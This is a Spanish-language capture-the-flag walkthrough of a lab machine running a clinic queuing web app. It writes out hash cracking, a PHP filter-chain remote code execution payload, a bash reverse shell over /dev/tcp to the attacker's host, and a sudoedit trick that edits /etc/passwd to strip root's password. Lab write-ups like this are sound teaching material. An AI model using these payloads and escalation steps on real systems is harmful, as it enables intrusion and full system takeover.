nmap:  80

![image](https://github.com/user-attachments/assets/2efcdff6-8aab-4844-9d4b-9df84354303e)

---
vamos a la pagina principal y hay un login 

![image](https://github.com/user-attachments/assets/ceb080c3-198f-466f-aeb2-f36ca68675c2)

hacemos un gobuster y nos da algunos que son llamativos

![image](https://github.com/user-attachments/assets/6db3b8c6-b51c-4cfd-b77c-1d350db89b1f)

aquí http://172.17.0.2/patients.php nos da una pagina con un calendario básico

![image](https://github.com/user-attachments/assets/008ad910-5b3d-4d83-ad24-c07126d5aaf7)

al /backup nos descargamos el zip y lo descomprimimos. nos da:

![image](https://github.com/user-attachments/assets/2f6d5bbe-ee79-48d9-869b-f85a7a42c6fe)

ahora entramos a una carpeta que nos dio llamada /db/ y nos da un txt que dentro hay un nombre o dos junto a una posible contraseña.
> castrojessica

![image](https://github.com/user-attachments/assets/feec5145-33e9-4e84-93c6-54fc19abe3f1)


utilizamos esta herramienta https://github.com/urbanadventurer/username-anarchy
para que nos genere contraseñas basadas en los nombres encontrados

dentro de la carpeta viendo el manual, creamos: nano username
> jessica castro

guardamos

ahora hacemos:

    ./username-anarchy -i username > users

y nos dará: 

![image](https://github.com/user-attachments/assets/f63b8c97-7470-4e27-87af-f8f4135137af)

también podemos ver que en el archivo "clinic_queuing_db.db " sale al contraseña 
y podemos hacerlo mas fácil  
pasamos la contraseña un hash 

>  $2y$10$iDHQftaCCEPmdPj/11E3DOGiw3AsOPf6uYBpEAuh8J19oeGuloJIK

  la pasamos a hash, nano hash y pegamos la contraseña
 ahora 
     
     john --wordlist=wordlist.txt hash
 
 y nos da la contraseña: 
 > j.castro
 
![image](https://github.com/user-attachments/assets/baf96a99-91d2-4ac7-bdae-66322e792093)

 
ahora vamos al login.php e ingresamos las credenciales:
> jessica / j.castro

y estamos dentro del panel

![image](https://github.com/user-attachments/assets/85c0234e-5902-4120-a4b1-8bac02376020)

tomamos el nombre principal de la pagina que dice:  # Clinic Queuing System

buscamos un exploit y encontramos: https://www.exploit-db.com/exploits/52008
que vemos que podemos filtrar por php:  py filter_chain 

![image](https://github.com/user-attachments/assets/449a178d-5102-40ea-b9a4-132c9bff8eb9)

buscamos un exploit en github: https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py

ahora copiamos el código  

creamos:
> nano filter.py / pegamos el código guardamos


![image](https://github.com/user-attachments/assets/8c00970d-f30f-4413-8051-73320aed657d)


> ahora python3 filter.py

ahora  en el terminal colocamos:
> python3 filter.py --chain '<?php echo shell_exec($_GET["cmd"]);?>'

nos dará un código que lo copiamos

![image](https://github.com/user-attachments/assets/4759141d-7a61-4ab1-8159-6bf156d6cb2d)

y colocamos el buscador así:  172.17.0.2/?cmd=ls -la&page= y aquí colocamos el código que nos dio  que es vulnerable a ejecución de código remoto (RCE)

![image](https://github.com/user-attachments/assets/1882fd64-397c-4ea4-ad7a-96a8856ac272)

ahora la URL debe quedar así:  172.17.0.2/?cmd=bash -c 'bash -i >%26/dev/tcp/172.17.0.1/443 0>%261'&page= y aquí colocamos el código que nos dio

dejamos la terminal en escucha y lanzamos

![image](https://github.com/user-attachments/assets/30de1100-7353-4a00-8bad-3bf59efb6db9)

y estamos dentro, buscando no encontré mucho y probé con las mismas credenciales ya que no hay otro usuario aparte de jessica y root:  jessica / j.castro

![image](https://github.com/user-attachments/assets/f91d2c15-86ad-4e95-b985-2b3caf3a07be)

ahora al hacer sudo -l aparece:  (root) NOPASSWD: sudoedit /var/www/html/*

para escalar encontré: 

![image](https://github.com/user-attachments/assets/41ea38c9-04e3-402f-845e-c2c726bc7df0)

o sea que puedo modificar el archivo, encontré este comando para poder dar el permiso de modificar por decir asi:

    export EDITOR='nano -- /etc/passwd'

ahora editamos:
  
    sudoedit /var/www/html/index.pgsd

le quitamos la x a root 

![image](https://github.com/user-attachments/assets/bc9961fd-a47b-4faa-98fb-b4f32dcec2af)

![[pasos1.png]]
colocamos su root y somos root!
![[suroot.png]]
muchas gracias! 
